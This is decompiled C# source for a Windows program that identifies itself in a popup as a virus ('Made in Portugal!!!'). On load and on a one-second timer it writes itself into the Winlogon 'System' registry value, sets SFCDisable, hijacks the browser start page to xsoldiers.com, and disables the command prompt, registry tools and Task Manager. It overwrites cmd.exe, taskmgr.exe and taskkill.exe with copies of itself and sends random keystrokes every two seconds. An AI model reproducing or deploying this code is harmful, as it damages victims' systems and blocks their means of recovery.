using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DRTSwinA.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace DRTSwinA;

[DesignerGenerated]
public class MainForm : Form
{
	private IContainer components;

	[AccessedThroughProperty("timer")]
	private Timer _timer;

	[AccessedThroughProperty("hiti")]
	private Timer _hiti;

	[AccessedThroughProperty("hitiGOOD")]
	private Timer _hitiGOOD;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("popup")]
	private Timer _popup;

	internal virtual Timer timer
	{
		get
		{
			return _timer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer_Tick;
			if (_timer != null)
			{
				_timer.remove_Tick(eventHandler);
			}
			_timer = value;
			if (_timer != null)
			{
				_timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer hiti
	{
		get
		{
			return _hiti;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = hiti_Tick;
			if (_hiti != null)
			{
				_hiti.remove_Tick(eventHandler);
			}
			_hiti = value;
			if (_hiti != null)
			{
				_hiti.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer hitiGOOD
	{
		get
		{
			return _hitiGOOD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = hitiGOOD_Tick;
			if (_hitiGOOD != null)
			{
				_hitiGOOD.remove_Tick(eventHandler);
			}
			_hitiGOOD = value;
			if (_hitiGOOD != null)
			{
				_hitiGOOD.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer popup
	{
		get
		{
			return _popup;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = popup_Tick;
			if (_popup != null)
			{
				_popup.remove_Tick(eventHandler);
			}
			_popup = value;
			if (_popup != null)
			{
				_popup.add_Tick(eventHandler);
			}
		}
	}

	public MainForm()
	{
		((Form)this).add_Load((EventHandler)MainForm_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		components = new Container();
		timer = new Timer(components);
		hiti = new Timer(components);
		hitiGOOD = new Timer(components);
		Button1 = new Button();
		popup = new Timer(components);
		((Control)this).SuspendLayout();
		timer.set_Enabled(true);
		timer.set_Interval(2000);
		hiti.set_Enabled(true);
		hiti.set_Interval(1000);
		hitiGOOD.set_Interval(10000);
		Button button = Button1;
		Point location = new Point(68, 56);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("PAROU");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		popup.set_Enabled(true);
		popup.set_Interval(30000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(210, 91);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("ZzZzZz");
		((Control)this).ResumeLayout(false);
	}

	[DllImport("User32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void GetWindowLong(IntPtr window, ref int index);

	[DllImport("User32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void SetWindowLong(IntPtr window, int index, int value);

	[DllImport("Kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void Sleep(long dwMilliseconds);

	private void Timer_Tick(object sender, EventArgs e)
	{
		SendKeys.Send(Conversions.ToString(MakeRandom()));
	}

	private void hiti_Tick(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "System", Environment.GetEnvironmentVariable("windir") + "\\inf\\drtswinb.exe", RegistryValueKind.String);
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "SFCDisable", -99, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\", "Start Page", "http://www.xsoldiers.com", RegistryValueKind.String);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableCMD", "1", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableRegistryTools", "1", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableTaskMgr", "1", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\System", "DisableCMD", "1", RegistryValueKind.DWord);
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "System", Environment.GetEnvironmentVariable("windir") + "\\inf\\drtswinb.exe", RegistryValueKind.String);
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "SFCDisable", -99, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\", "Start Page", "http://www.xsoldiers.com", RegistryValueKind.String);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableCMD", "1", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableRegistryTools", "1", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableTaskMgr", "1", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\System", "DisableCMD", "1", RegistryValueKind.DWord);
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable("windir") + "\\system32\\taskkill.exe", true);
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable("windir") + "\\system32\\taskmgr.exe", true);
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable("windir") + "\\system32\\cmd.exe", true);
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable("windir") + "\\inf\\drtswinb.exe", true);
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable("windir") + "\\drtswina.exe", true);
	}

	private void hitiGOOD_Tick(object sender, EventArgs e)
	{
	}

	private object MakeRandom()
	{
		Conversions.ToString(Strings.Chr((int)Math.Round(64f + VBMath.Rnd() * 10000000f % 26f)));
		return Conversions.ToString(Strings.Chr((int)Math.Round(96f + VBMath.Rnd() * 10000000f % 26f)));
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "System", "", RegistryValueKind.String);
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "SFCDisable", 0, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\", "Start Page", "http://www.google.pt", RegistryValueKind.String);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableCMD", "0", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", "0", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "0", RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\System", "DisableCMD", "0", RegistryValueKind.DWord);
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Environment.CurrentDirectory + "\\backup\\taskkill.exe", Environment.GetEnvironmentVariable("windir") + "\\system32\\taskkill.exe", true);
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Environment.CurrentDirectory + "\\backup\\taskmgr.exe", Environment.GetEnvironmentVariable("windir") + "\\system32\\taskmgr.exe", true);
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Environment.CurrentDirectory + "\\backup\\cmd.exe", Environment.GetEnvironmentVariable("windir") + "\\system32\\cmd.exe", true);
		ProjectData.EndApp();
	}

	private void popup_Tick(object sender, EventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Made in Portugal!!!", "Virus...", (MessageBoxButtons)0, (MessageBoxIcon)64, (MessageBoxDefaultButton)0);
	}
}
